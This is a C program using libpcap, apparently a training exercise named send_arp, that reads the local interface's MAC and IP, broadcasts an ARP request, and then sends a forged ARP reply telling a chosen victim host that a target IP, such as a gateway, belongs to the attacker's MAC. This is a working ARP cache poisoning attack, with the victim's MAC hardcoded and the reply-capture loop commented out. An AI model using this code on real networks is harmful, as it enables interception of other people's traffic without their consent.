#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <unistd.h>

#define ARP_REQUEST 0x0001
#define ARP_REPLY 0x0002
#define ETH_TYPE 0x0001
#define IP_TYPE 0x0800
#define ARP_TYPE 0x0806
#define MAC_LEN 0x06
#define IP_LEN 0x04

const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t UNDEFINED[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

void usage() {
	printf("syntax : send_arp <interface> <sender ip> <target ip>\n");
	printf("sample : send_arp wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[]) {
	if(argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if(handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	uint8_t attacker_ip[4], sender_ip[4], target_ip[4];
	uint8_t attacker_mac[6], sender_mac[6];

	inet_pton(AF_INET, argv[2], sender_ip);
	inet_pton(AF_INET, argv[3], target_ip);

	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_STREAM,0);
	strcpy(ifr.ifr_name, dev);
	ioctl(s, SIOCGIFHWADDR, &ifr);
	memcpy(attacker_mac, (uint8_t*) ifr.ifr_hwaddr.sa_data, 6);
	ioctl(s, SIOCGIFADDR, &ifr);
	memcpy(attacker_ip, &((struct sockaddr_in *) &ifr.ifr_addr) -> sin_addr, 4);
	close(s);
	printf("mac : ");
	for(int i = 0; i < 6; i++) printf("%x ",attacker_mac[i]);
	printf("\n ip : ");
	for(int i = 0; i < 4; i++) printf("%d ",attacker_ip[i]);
	printf("\n");
	
	u_char my_packet[100];
	uint16_t tmp;
	memcpy(my_packet, BROADCAST, MAC_LEN);
	memcpy(my_packet + 6, attacker_mac, MAC_LEN);
	memcpy(my_packet + 12, &(tmp = htons(ARP_TYPE)), 2);
	memcpy(my_packet + 14, &(tmp = htons(ETH_TYPE)), 2);
	memcpy(my_packet + 16, &(tmp = htons(IP_TYPE)), 2);
	memcpy(my_packet + 18, &(tmp = MAC_LEN), 1);
	memcpy(my_packet + 19, &(tmp = IP_LEN), 1);
	memcpy(my_packet + 20, &(tmp = htons(ARP_REQUEST)), 2);
	memcpy(my_packet + 22, attacker_mac, MAC_LEN);
	memcpy(my_packet + 28, attacker_ip, IP_LEN);
	memcpy(my_packet + 32, UNDEFINED, MAC_LEN);
	memcpy(my_packet + 38, sender_ip, IP_LEN);
	
	pcap_sendpacket(handle, my_packet, 42);	
	struct pcap_pkthdr* header;
	const u_char* packet;
	struct bpf_program fp;
	bpf_u_int32 net;
	//pcap_compile(handle, &fp, "ether proto arp", 0, net);
	//pcap_setfilter(handle, &fp);
	for(int i=0;i<42;i++) {printf("%x ",my_packet[i]);
		if(i%4==3) printf("\n");
	}
	printf("\n");
	/*
	while(true){
		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		printf("%d\n",ntohs(*(uint8_t*)(packet+20)));
		if(ntohs(*(uint8_t*)(packet+20))!=ARP_REPLY) continue;
		break;
	}
	printf("len : %d\n",header->len);
	printf("%d\n",ntohs(*(uint8_t*) (packet + 20)));
	memcpy(sender_mac, packet + 6, 6);*/
	u_char mymac[6] = {0xe8,0x2a,0x44,0xae,0x94,0x6b};
	memcpy(sender_mac, mymac, 6);
	for(int i=0;i<6;i++) printf("%x ",sender_mac[i]);
	printf("\n");	
	//for(int i=0;i<42;i++) {printf("%x ",packet[i]);
	//if(i%4==3) printf("\n");
	//}
	memcpy(my_packet, sender_mac, MAC_LEN);
	memcpy(my_packet + 6, attacker_mac, MAC_LEN);
	memcpy(my_packet + 12, &(tmp = htons(ARP_TYPE)), 2);
	memcpy(my_packet + 14, &(tmp = htons(ETH_TYPE)), 2);
        memcpy(my_packet + 16, &(tmp = htons(IP_TYPE)), 2);
        memcpy(my_packet + 18, &(tmp = MAC_LEN), 1);
        memcpy(my_packet + 19, &(tmp = IP_LEN), 1);
	memcpy(my_packet + 20, &(tmp = htons(ARP_REPLY)), 2);
	memcpy(my_packet + 22, attacker_mac, MAC_LEN);
	memcpy(my_packet + 28, target_ip, IP_LEN);
	memcpy(my_packet + 32, sender_mac, MAC_LEN);
	memcpy(my_packet + 38, sender_ip, IP_LEN);
	pcap_sendpacket(handle, my_packet, 42);
	for(int i=0;i<42;i++) {
		printf("%x ",my_packet[i]);
		if(i%4==3) printf("\n");
	}
	printf("\n");
	return 0;
}
